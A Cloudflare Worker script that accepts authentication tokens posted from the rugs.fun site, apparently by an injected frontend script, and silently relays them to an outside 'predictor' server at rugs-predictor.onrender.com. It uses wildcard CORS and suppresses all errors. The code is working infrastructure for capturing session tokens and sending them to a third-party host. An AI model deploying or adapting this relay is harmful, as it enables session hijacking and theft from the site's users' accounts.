// Cloudflare Worker — Token Receiver
// Called from rugs.fun frontend when user authenticates
// Forwards token to predictor server

const PREDICTOR = 'https://rugs-predictor.onrender.com/token';

export default {
  async fetch(request, env, ctx) {
    // CORS headers so rugs.fun can call this
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    };

    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    if (request.method === 'POST') {
      try {
        const body = await request.json();
        const token = body.token;

        if (token && token.length > 50) {
          // Forward to predictor
          ctx.waitUntil(
            fetch(PREDICTOR, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ token, source: 'cloudflare-worker' })
            }).catch(() => {})
          );

          return new Response(JSON.stringify({ ok: true }), {
            headers: { ...corsHeaders, 'Content-Type': 'application/json' }
          });
        }
      } catch (e) {}
    }

    return new Response(JSON.stringify({ ok: false }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' }
    });
  }
};
